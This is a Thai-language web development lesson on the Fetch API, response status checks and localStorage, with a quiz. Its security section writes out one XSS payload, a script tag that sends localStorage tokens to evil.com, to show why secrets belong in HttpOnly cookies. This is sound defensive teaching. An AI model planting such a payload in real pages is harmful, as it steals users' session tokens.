Fetch API + LocalStorage

ดึงข้อมูลจากโลกภายนอก และจำข้อมูลไว้ไม่ให้หาย — สอนในมุมมองของคนที่เคยเป็น Pentester

🎯 จบบทนี้คุณจะ...

  • เขียน fetch pattern มาตรฐานที่มี loading / error / finally ครบแบบ production
  • รู้กับดัก res.ok ที่ 90% ของมือใหม่ไม่รู้
  • ใช้ LocalStorage ถูกวิธี และอธิบายได้ว่า "อะไรห้ามเก็บ เพราะอะไร" (XSS)

🔑 คีย์เวิร์ดภาพจำประจำบท

📦 พนักงานส่งของ 2 จังหวะ = fetch แล้ว .json() ⚠️ กล่องมาถึงแต่ข้างในคือข่าวร้าย = 404/500 ไม่เข้า catch 🚪 เช็คหน้ากล่องก่อนแกะ = res.ok 🗄 ตู้เก็บของที่ใครในห้องก็เปิดได้ = localStorage 🕵️ script แปลกปลอมในห้อง = XSS 🔒 ตู้เซฟที่ JS เปิดไม่ได้ = HttpOnly cookie

🧠 แนวคิด & หลักการของ Dev ประจำบทนี้

หลักการ 1: "Never trust the network" (เครือข่ายพังได้เสมอ — ออกแบบเผื่อไว้)

ทุกครั้งที่ข้อมูลข้ามเครื่อง อะไรก็พังได้: เน็ตหลุด, server ล่ม, ตอบช้า 30 วิ, ตอบมาแต่ format ผิด Dev มืออาชีพจึงเขียน UI ครบ 4 สถานะเสมอ: Loading / Success / Error / Empty — มือใหม่เขียนแค่ Success สถานะเดียว แล้วเว็บก็ "ค้างเงียบ ๆ" เมื่อโลกจริงไม่เป็นใจ (นี่คือเหตุผลที่ Mission บังคับเทสต์แบบปิด WiFi)

หลักการ 2: "Single source of truth" (ความจริงต้องมีที่เก็บเดียว)

ใน Mission Favorites — ข้อมูลจริงอยู่ใน localStorage ที่เดียว หน้าจอเป็นแค่ "ภาพสะท้อน" ของมัน ทุกการแก้ไขทำที่ storage แล้ว render ใหม่จากต้นทางเสมอ ไม่แก้หน้าจอตรง ๆ แยกจาก storage (เพราะเดี๋ยวสองที่ไม่ตรงกัน = บั๊กคลาสสิก) หลักการนี้คือรากของ React state ที่จะเจอใน Week 8 — เรียนตอนนี้ = ได้เปรียบตอนนั้น

หลักการ 3: "Defense in depth" (ป้องกันหลายชั้น — มุม pentester)

อย่าฝากความปลอดภัยไว้กับชั้นเดียว: เช็ค res.ok (ชั้น 1) + try/catch (ชั้น 2) + ไม่เก็บของลับใน localStorage (ชั้น 3) + validate ข้อมูลก่อนใช้ (ชั้น 4) แต่ละชั้นกันคนละเรื่อง พังชั้นหนึ่งยังเหลือชั้นอื่น — หลักเดียวกับที่คุณใช้ตอน pentest แค่ตอนนี้อยู่ฝั่งสร้างกำแพงแทนฝั่งปีน

เมื่อไหร่ใช้ / ไม่ใช้ localStorage: ใช้กับ preference และ cache ที่ไม่ลับ / ไม่ใช้กับข้อมูลที่ต้อง sync ข้ามเครื่อง (ต้องใช้ database — Week 4) และห้ามใช้กับความลับทุกชนิด

ส่วนที่ 1: Fetch API คืออะไร ทำงานยังไง

1

ภาพรวม: พนักงานส่งของระหว่างเว็บเรากับ Server

fetch() คือคำสั่งส่ง HTTP Request ออกไปขอข้อมูลจาก Server แล้วรอรับ Response กลับมา เพราะข้อมูลต้องเดินทางผ่านอินเทอร์เน็ต (กินเวลาไม่แน่นอน) — fetch จึงเป็น async เสมอ และนี่คือเหตุผลที่ต้องเรียนบทที่ 1 ก่อน

ขั้นตอนมี 2 จังหวะที่ต้องรอ:

const res  = await fetch(url);   // จังหวะ 1: รอ "กล่องพัสดุ" (Response) มาถึง
const data = await res.json();   // จังหวะ 2: รอ "แกะกล่อง" แปลงเนื้อในเป็น Object

ทำไมแกะกล่องต้องรอด้วย? เพราะข้อมูลอาจใหญ่มาก (หลาย MB) browser ทยอยอ่านเป็น stream การแปลงทั้งก้อนเป็น JSON จึงเป็นงานที่ใช้เวลาเช่นกัน

2

กับดักใหญ่: fetch ไม่ถือว่า 404/500 เป็น error!

นี่คือจุดที่มือใหม่ (และมือกลางจำนวนมาก) พลาด: fetch จะ throw เข้า catch เฉพาะตอน network ล่ม (เน็ตหลุด, DNS ไม่เจอ, CORS block) แต่ถ้า Server ตอบกลับมาว่า 404 Not Found หรือ 500 Internal Error — fetch ถือว่า "ส่งของสำเร็จ" เพราะมี response กลับมาจริง ๆ แค่เนื้อในเป็นข่าวร้าย

// ❌ โค้ดนี้จะไม่เข้า catch แม้ server ตอบ 500
try {
  const res = await fetch("/api/broken");
  const data = await res.json();   // อาจพังตรงนี้แทน หรือได้ data ขยะ
} catch (err) { ... }

// ✅ ต้องเช็ค res.ok เองเสมอ (ok = status 200-299)
try {
  const res = await fetch("/api/broken");
  if (!res.ok) throw new Error(`HTTP ${res.status}`);  // ← บรรทัดสำคัญที่สุดของบทนี้
  const data = await res.json();
} catch (err) { ... }
สถานการณ์เข้า catch ไหม?วิธีจัดการ
เน็ตหลุด / server ดับ✅ เข้าcatch จัดการเอง
Server ตอบ 404 / 500❌ ไม่เข้าต้องเช็ค res.ok แล้ว throw เอง
ตอบ 200 แต่ body ไม่ใช่ JSON✅ เข้า (พังตอน .json())catch จัดการเอง
3

Pattern มาตรฐาน 7 ขั้น (ใช้ได้ตลอดชีวิต dev)

const loadData = async () => {
  showLoading();                                        // 1. บอกผู้ใช้ว่ากำลังทำงาน
  try {
    const res = await fetch(url);                       // 2. รอ response
    if (!res.ok) throw new Error(`HTTP ${res.status}`); // 3. เช็คสถานะก่อนเสมอ
    const data = await res.json();                      // 4. แกะ JSON
    render(data);                                       // 5. สำเร็จ → วาดหน้าจอ
  } catch (err) {
    showError(err.message);                             // 6. พัง → บอกผู้ใช้ดี ๆ
  } finally {
    hideLoading();                                      // 7. ปิด loading ทุกกรณี
  }
};
ทำไมต้อง finally? ถ้าปิด loading ไว้ใน try อย่างเดียว เวลา error จะลืมปิด → ผู้ใช้เห็น "กำลังโหลด..." ค้างตลอดกาล finally ทำงานทุกกรณีไม่ว่าสำเร็จหรือพัง — เหมาะกับงาน "เก็บกวาด" แบบนี้ที่สุด

ส่วนที่ 2: LocalStorage — ความจำของ Browser

1

ปัญหา: ตัวแปร JS ตายทุกครั้งที่ refresh

ทุกตัวแปรที่คุณสร้าง (let cart = [...]) อยู่ใน RAM ของแท็บนั้น กด refresh ปุ๊บ — หายเกลี้ยง LocalStorage คือ "ตู้เก็บของถาวร" ของ browser ที่อยู่รอดข้าม refresh, ปิดเครื่อง, เปิดใหม่

2

คำสั่งมีแค่ 4 ตัว แต่มีกฎเหล็ก 1 ข้อ

localStorage.setItem("key", value);   // เก็บ
localStorage.getItem("key");          // อ่าน (ไม่มี → ได้ null)
localStorage.removeItem("key");       // ลบทีละตัว
localStorage.clear();                 // ล้างหมดทั้งเว็บ (ระวัง!)
กฎเหล็ก: เก็บได้แค่ String เท่านั้น — ถ้ายัด Array/Object เข้าไปตรง ๆ มันจะถูกแปลงเป็น "[object Object]" แบบใช้งานไม่ได้ ต้องแปลงไปกลับเสมอ:
// เก็บ: Object → String
localStorage.setItem("cart", JSON.stringify(cart));

// อ่าน: String → Object (พร้อมกันค่า null ครั้งแรก)
const cart = JSON.parse(localStorage.getItem("cart")) ?? [];

เครื่องหมาย ?? (Nullish Coalescing) แปลว่า "ถ้าข้างหน้าเป็น null/undefined ให้ใช้ค่าข้างหลังแทน" — ใช้กันเคสเปิดเว็บครั้งแรกที่ยังไม่เคยเก็บอะไร

3

🔐 มุม Security: อะไรห้ามเก็บ และทำไม (จุดขายของคุณ)

localStorage อ่านได้ด้วย JavaScript ทุกบรรทัดที่รันในหน้านั้น — รวมถึง script ของคนร้ายที่ฝังเข้ามาผ่านช่องโหว่ XSS (Cross-Site Scripting)

ลองคิดแบบ pentester (ซึ่งคุณเคยเป็น): ถ้าเว็บมีจุดที่แสดง input ของผู้ใช้โดยไม่ escape ผมฝัง <script>fetch('https://evil.com?steal=' + localStorage.getItem('token'))</script> ลงใน comment ได้ — token ของทุกคนที่เปิดหน้านั้นไหลมาที่ผมทันที

ข้อมูลเก็บใน localStorage ได้ไหมเหตุผล
ธีม Dark mode, ภาษา✅ ได้รั่วไปก็ไม่มีใครเดือดร้อน
ตะกร้าสินค้า (ยังไม่จ่าย)✅ ได้ข้อมูลไม่ลับ
Password🚫 ห้ามเด็ดขาดXSS เดียวจบ
Access token อายุยาว🚫 ไม่ควรระบบจริงใช้ HttpOnly Cookie ซึ่ง JS อ่านไม่ได้ → XSS ขโมยไม่ได้

หัวข้อ "token ควรอยู่ไหน" จะกลับมาอีกครั้งตอน Kcode Day 5 (JWT) — ตอนนั้นผมจะถามคุณว่าคอร์สสอนเก็บไว้ที่ไหน และคุณเห็นด้วยไหมในมุม security

ส่วนที่ 2.5: fetch มากกว่าแค่ GET — POST/PUT/DELETE (ปูทาง Week 2)

ที่ผ่านมาเราใช้ fetch แค่ "ขอข้อมูล" (GET) — แต่ของจริงต้อง "ส่งข้อมูล" ด้วย ซึ่งคือสิ่งที่คุณจะสร้างฝั่ง server ใน Week 2:

Methodความหมายมี body ไหม
GETขอดูข้อมูล (default)ไม่มี
POSTสร้างใหม่มี (ข้อมูลที่จะสร้าง)
PUT / PATCHแก้ไข (ทั้งชิ้น / บางส่วน)มี
DELETEลบปกติไม่มี
// ส่งข้อมูลด้วย POST — 3 ส่วนที่ต้องครบ
const res = await fetch("/api/books", {
  method: "POST",                              // 1. บอก method
  headers: { "Content-Type": "application/json" }, // 2. บอกว่า body เป็น JSON
  body: JSON.stringify({ title, author }),     // 3. แปลง object → string ก่อนส่ง
});
if (!res.ok) throw new Error(`HTTP ${res.status}`);
const created = await res.json();
3 จุดที่มือใหม่ลืมบ่อย: ① ลืม headers Content-Type → server แกะ body ไม่ออก ② ลืม JSON.stringify → ส่ง "[object Object]" ③ ลืมว่า body ต้องเป็น string เสมอ (เหมือน localStorage) — สังเกตว่า GET/POST/status code ทั้งหมดนี้คือสิ่งที่คุณจะเป็นคน "รับ" ฝั่ง server ใน Week 2 (อีกด้านของเหรียญเดียวกัน)

ส่วนที่ 2.6: localStorage vs sessionStorage vs Cookie — เลือกให้ถูก

localStoragesessionStorageCookie
อยู่นานแค่ไหนถาวร (จนลบเอง)ปิดแท็บ = หายตั้งวันหมดอายุได้
ขนาด~5-10 MB~5 MB~4 KB (เล็ก!)
ส่งไป server อัตโนมัติ❌ ไม่❌ ไม่✅ ทุก request
JS อ่านได้✅✅✅ (ยกเว้น HttpOnly)

หลักเลือก: ข้อมูลต้องอยู่ข้ามวัน + ไม่ลับ → localStorage · ชั่วคราวแท็บเดียว → sessionStorage · auth/ต้องส่ง server ทุกครั้ง → Cookie (HttpOnly)

🧹 Clean Code: เขียน fetch แบบ production

1. แยกฟังก์ชัน API ออกจาก UI (ไม่ปน fetch กับ DOM)

❌ fetch + DOM ปนกัน

btn.onclick = async () => {
  const res = await fetch("/api/books");
  const data = await res.json();
  list.innerHTML = data.map(...);  // ปน!
};

✅ แยกชั้น (เหมือน backend)

// ชั้น API
async function getBooks() {
  const res = await fetch("/api/books");
  if (!res.ok) throw new Error(res.status);
  return res.json();
}
// ชั้น UI
btn.onclick = async () => {
  const books = await getBooks();
  renderBooks(books);
};

ประโยชน์: เปลี่ยน API ไม่ต้องแตะ UI · test ง่าย · เอา getBooks ไปใช้ซ้ำที่อื่นได้ — นี่คือ "Separation of Concerns" ที่จะเจอเต็มฝั่ง server Week 2

2. จัดการ 4 สถานะ UI เสมอ (ไม่ใช่แค่ success)

// ทุกการ fetch ต้องคิดถึง 4 สถานะ:
// Loading (กำลังโหลด) · Success (มีข้อมูล) · Error (พัง) · Empty (สำเร็จแต่ว่าง)
if (loading) return showSpinner();
if (error)   return showError();
if (items.length === 0) return showEmpty();  // ⭐ มือใหม่ลืมเคสนี้
renderList(items);
กฎทอง: เช็ค res.ok เสมอ · ปิด loading ใน finally · แยก API จาก UI · คิดครบ 4 สถานะ — โค้ดที่จัดการแค่ success คือโค้ด demo ไม่ใช่ production

📝 Quiz ท้ายบท

ตอบเองก่อนเปิดเฉลย แล้วส่งคำตอบใน chat

ข้อ 1: ทำไม fetch ที่ได้ HTTP 500 ถึงไม่เข้า catch (ถ้าไม่เช็ค res.ok) แต่ network ล่มถึงเข้า?

เพราะในมุมของ fetch "หน้าที่ของฉันคือส่ง request และเอา response กลับมา" — 500 ก็คือ response ที่ส่งสำเร็จ (มีของกลับมา แค่ข้างในเป็นข่าวร้าย) จึงถือว่างานสำเร็จ ส่วน network ล่ม = ไม่มี response เลย = ทำหน้าที่ไม่สำเร็จ → throw ดังนั้น dev ต้องเช็คความหมายทางธุรกิจของ status เอง ผ่าน res.ok / res.status

ข้อ 2: ในมุม pentester — อธิบายการโจมตีที่ทำให้ token ใน localStorage รั่ว และทำไม HttpOnly cookie ป้องกันได้

การโจมตีคือ XSS: ถ้าเว็บแสดงข้อมูลที่ผู้ใช้กรอกโดยไม่ sanitize/escape คนร้ายฝัง script ลงในหน้าได้ และ script นั้นอ่าน localStorage.getItem("token") แล้วส่งออกไป server ตัวเองได้ทันที เพราะ localStorage เปิดให้ JS ทุกบรรทัดอ่านได้ ส่วน HttpOnly cookie คือ cookie ที่ browser ห้าม JavaScript อ่าน (document.cookie มองไม่เห็น) มันถูกแนบไปกับ request โดย browser เอง — ต่อให้โดน XSS ก็อ่าน token ตรง ๆ ไม่ได้

ข้อ 3: ?? ใน JSON.parse(localStorage.getItem("x")) ?? [] ทำหน้าที่อะไร ต่างจาก || ยังไง?

?? คืนค่าขวาเฉพาะเมื่อซ้ายเป็น null หรือ undefined ส่วน || คืนค่าขวาเมื่อซ้ายเป็น falsy ทุกชนิด (รวม 0, "", false) เคสนี้ใช้ ?? ปลอดภัยกว่า เช่น ถ้าเก็บค่า 0 ไว้จริง ๆ || [] จะเหมาเอาว่าไม่มีข้อมูลแล้วทับด้วย array เปล่า — บั๊กเงียบที่หายากมาก

ข้อ 4: ส่ง POST แล้ว server บอกว่า body ว่าง ทั้งที่เราใส่ข้อมูล — ลืมอะไร 2 อย่าง?

① ลืม headers: { "Content-Type": "application/json" } → server ไม่รู้ว่า body เป็น JSON เลยแกะไม่ออก ② ลืม JSON.stringify(data) → ส่ง object ตรง ๆ กลายเป็น "[object Object]" — body ต้องเป็น string เสมอ

ข้อ 5: เก็บ auth token — เลือก localStorage หรือ Cookie? เพราะอะไร (มุม security)?

Cookie แบบ HttpOnly — เพราะ JS อ่านไม่ได้ ต่อให้โดน XSS ก็ขโมย token ไม่ได้ ส่วน localStorage เปิดให้ JS ทุกบรรทัดอ่าน (รวม script ของคนร้าย) = XSS เดียวจบ ข้อแลกเปลี่ยน: Cookie ต้องระวัง CSRF (จะเรียนป้องกันใน Week 17-18) — ไม่มีที่เก็บไหนสมบูรณ์แบบ ต้องเลือกตามภัยที่กลัว

ข้อ 6 (clean code): ทำไมควรแยกฟังก์ชัน getBooks() ออกจากปุ่ม onclick?

Separation of Concerns — ชั้น API (fetch) แยกจากชั้น UI (DOM) → เปลี่ยน endpoint ไม่ต้องแตะ UI, test ฟังก์ชัน API แยกได้, เอา getBooks ไปใช้ซ้ำหน้าอื่นได้ · เป็นหลักเดียวกับการแยก routes/controllers/services ฝั่ง server (Week 2)
